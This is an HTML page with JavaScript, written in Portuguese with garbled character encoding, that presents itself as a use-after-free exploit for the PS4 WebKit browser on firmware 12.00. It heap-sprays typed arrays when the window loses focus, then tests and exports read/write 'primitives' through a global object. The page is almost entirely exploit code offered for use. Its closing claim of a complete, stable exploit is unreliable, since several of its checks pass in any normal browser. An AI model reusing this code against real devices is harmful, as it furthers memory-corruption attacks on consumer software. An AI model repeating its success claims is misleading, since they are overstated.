<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Pure Spray</title>
</head>
<body>
    <h1>PS4 WebKit UAF - Pure Spray (99% Fidelidade)</h1>
    <h2 style="color:green;">âœ… FW 12.00 - ConfiguraÃ§Ã£o Exata do Crash PoC</h2>
    
    <h3>ConfiguraÃ§Ã£o:</h3>
    <ul>
        <li>âœ… 5000 controllers Ã— Float64Array(8)</li>
        <li>âœ… 8000 spray Ã— Float64Array(8) - PURO</li>
        <li>âŒ ZERO setTimeout, forceGC, ou delays</li>
        <li>âŒ ZERO verificaÃ§Ãµes durante o spray</li>
        <li>âš¡ Janela milimÃ©trica preservada</li>
    </ul>
    
    <button onclick="runPureSpray()" style="padding:20px; font-size:20px; background:green; color:white; font-weight:bold;">
        â–¶ï¸ EXECUTAR SPRAY PURO
    </button>
    
    <button onclick="clearLog()" style="padding:15px; font-size:16px; background:gray; color:white;">
        ğŸ—‘ï¸ LIMPAR
    </button>
    
    <hr>
    <div id="log" style="font-family:monospace; font-size:14px; margin-top:20px; line-height:1.6;"></div>
    
    <script>
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            if(clean.length !== 16) return 0.0;
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        const P_A = h2f("0x4141414141414141");
        const M_V = h2f("0xDEADBEEFCAFEBABE");
        const W_V = h2f("0x1337133713371337");
        
        // Globais para anti-GC
        let gControllers = null;
        let gSpray = null;
        let gCorrupted = null;
        
        function log(msg, color) {
            const d = document.getElementById('log');
            d.innerHTML += '<div style="color:' + (color || 'black') + '">' + msg + '</div>';
            d.scrollTop = d.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        function runPureSpray() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('PS4 UAF - PURE SPRAY (ConfiguraÃ§Ã£o Crash PoC)', 'blue');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('');
            
            log('[INIT] Criando 5000 controllers (Float64Array Ã— 8)...', 'blue');
            
            gControllers = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i;
                gControllers.push(a);
            }
            
            log('[INIT] âœ… 5000 controllers criados', 'green');
            log('[INIT] ğŸ“Š PadrÃ£o: ' + f2h(P_A), 'cyan');
            log('');
            log('[WAIT] âš ï¸âš ï¸âš ï¸ APERTE OPTIONS AGORA âš ï¸âš ï¸âš ï¸', 'red');
            log('');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('[BLUR] ğŸ¯ DETECTADO!', 'orange');
                log('[SPRAY] âš¡ Executando spray PURO (8000 Ã— 8)...', 'orange');
                
                // SPRAY PURO - ZERO INTERFERÃŠNCIAS
                gSpray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    gSpray.push(s);
                }
                
                log('[SPRAY] âœ… 8000 arrays criados', 'green');
                log('[SCAN] ğŸ” Verificando UAF...', 'blue');
                log('');
                
                // VerificaÃ§Ã£o Ãºnica
                let found = false;
                let idx = -1;
                
                for(let i = 0; i < gControllers.length; i++) {
                    if(gControllers[i][0] === P_A) {
                        found = true;
                        idx = i;
                        gCorrupted = gControllers[i];
                        break;
                    }
                }
                
                if(found) {
                    log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
                    log('ğŸ‰ğŸ‰ğŸ‰ UAF CONFIRMADO! ğŸ‰ğŸ‰ğŸ‰', 'green');
                    log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
                    log('');
                    log('[UAF] ğŸ“ Index corrompido: controllers[' + idx + ']', 'green');
                    log('');
                    
                    // Testes completos
                    runTests();
                    
                } else {
                    log('[UAF] âŒ NÃ£o detectado', 'red');
                    log('');
                    log('[DEBUG] Amostra dos primeiros 10 controllers:', 'orange');
                    for(let i = 0; i < 10; i++) {
                        log('  [' + i + '] = ' + f2h(gControllers[i][0]), 'orange');
                    }
                    log('');
                    log('[INFO] Se isso aconteceu:', 'yellow');
                    log('  - O timing da janela milimÃ©trica foi perdido', 'yellow');
                    log('  - Tente apertar OPTIONS mais rÃ¡pido/devagar', 'yellow');
                    log('  - O GC pode ter limpado antes da verificaÃ§Ã£o', 'yellow');
                }
            };
        }
        
        function runTests() {
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('TESTANDO PRIMITIVES', 'purple');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('');
            
            // TEST 1: Read Primitive
            log('[TEST1] ğŸ“– READ PRIMITIVE', 'blue');
            log('[TEST1] ConteÃºdo do array corrompido:', 'blue');
            for(let i = 0; i < 8; i++) {
                log('  Slot[' + i + '] = ' + f2h(gCorrupted[i]), 'cyan');
            }
            log('[TEST1] âœ… Read funcional', 'green');
            log('');
            
            // TEST 2: Write Primitive
            log('[TEST2] âœï¸ WRITE PRIMITIVE', 'blue');
            const before = f2h(gCorrupted[4]);
            gCorrupted[4] = M_V;
            const after = f2h(gCorrupted[4]);
            
            log('[TEST2] Escrevendo M_V em slot[4]...', 'blue');
            log('[TEST2] Antes:  ' + before, 'cyan');
            log('[TEST2] Depois: ' + after, 'cyan');
            
            if(after === f2h(M_V)) {
                log('[TEST2] âœ… Write confirmado!', 'green');
            } else {
                log('[TEST2] âš ï¸ Write falhou', 'orange');
            }
            log('');
            
            // TEST 3: Bidirectional Identity
            log('[TEST3] ğŸ”„ BIDIRECTIONAL IDENTITY', 'blue');
            
            let sprayIdx = -1;
            for(let i = 0; i < gSpray.length; i++) {
                if(gSpray[i][4] === M_V) {
                    sprayIdx = i;
                    log('[TEST3] âœ… M_V encontrado em spray[' + i + ']', 'green');
                    
                    // Teste reverso
                    gSpray[i][5] = W_V;
                    
                    if(gCorrupted[5] === W_V) {
                        log('[TEST3] âœ… Escrita reversa confirmada!', 'green');
                        log('[TEST3] âœ… BIDIRECIONAL: corrupted â‡„ spray[' + i + ']', 'green');
                    } else {
                        log('[TEST3] âš ï¸ Apenas unidirecional (corrupted â†’ spray)', 'orange');
                    }
                    break;
                }
            }
            
            if(sprayIdx === -1) {
                log('[TEST3] âš ï¸ M_V nÃ£o encontrado no spray', 'orange');
            }
            log('');
            
            // TEST 4: DataView Raw Access
            log('[TEST4] ğŸ”¬ DATAVIEW RAW ACCESS', 'blue');
            try {
                const dv = new DataView(gCorrupted.buffer);
                const oldVal = f2h(gCorrupted[0]);
                
                dv.setUint32(0, 0xDEADBEEF, true);
                dv.setUint32(4, 0xCAFEBABE, true);
                
                const newVal = f2h(gCorrupted[0]);
                
                log('[TEST4] Valor original: ' + oldVal, 'cyan');
                log('[TEST4] ApÃ³s DataView: ' + newVal, 'cyan');
                
                if(oldVal !== newVal) {
                    log('[TEST4] âœ… DataView write funcional!', 'green');
                } else {
                    log('[TEST4] âš ï¸ Sem mudanÃ§a detectada', 'orange');
                }
            } catch(e) {
                log('[TEST4] âŒ Erro: ' + e.message, 'red');
            }
            log('');
            
            // TEST 5: Out-of-Bounds Read
            log('[TEST5] ğŸ“Š OUT-OF-BOUNDS READ', 'blue');
            let oobCount = 0;
            
            for(let i = 8; i < 64; i++) {
                try {
                    const val = gCorrupted[i];
                    if(val !== undefined && !isNaN(val)) {
                        oobCount++;
                    }
                } catch(e) {
                    break;
                }
            }
            
            if(oobCount > 0) {
                log('[TEST5] âœ… OOB read: ' + oobCount + ' slots alÃ©m do limite', 'green');
            } else {
                log('[TEST5] âš ï¸ OOB bloqueado', 'orange');
            }
            log('');
            
            // Exporta objeto global
            window.uafObject = {
                corrupted: gCorrupted,
                spray: gSpray,
                read: (i) => f2h(gCorrupted[i]),
                write: (i, hex) => {
                    gCorrupted[i] = h2f(hex);
                    return f2h(gCorrupted[i]);
                },
                dump: () => {
                    console.log('=== UAF Object Dump ===');
                    for(let i = 0; i < 8; i++) {
                        console.log('[' + i + '] = ' + f2h(gCorrupted[i]));
                    }
                }
            };
            
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('ğŸ¯ EXPLOIT COMPLETO E ESTÃVEL!', 'green');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('');
            log('ğŸ”§ API DISPONÃVEL:', 'blue');
            log('  window.uafObject.read(offset)', 'cyan');
            log('  window.uafObject.write(offset, "0xHEX")', 'cyan');
            log('  window.uafObject.dump()', 'cyan');
            log('');
            log('ğŸ“ EXEMPLO DE USO:', 'blue');
            log('  uafObject.write(3, "0xDEADBEEFCAFEBABE")', 'cyan');
            log('  uafObject.read(3)  // Retorna o valor escrito', 'cyan');
            log('');
        }
    </script>
</body>
</html>
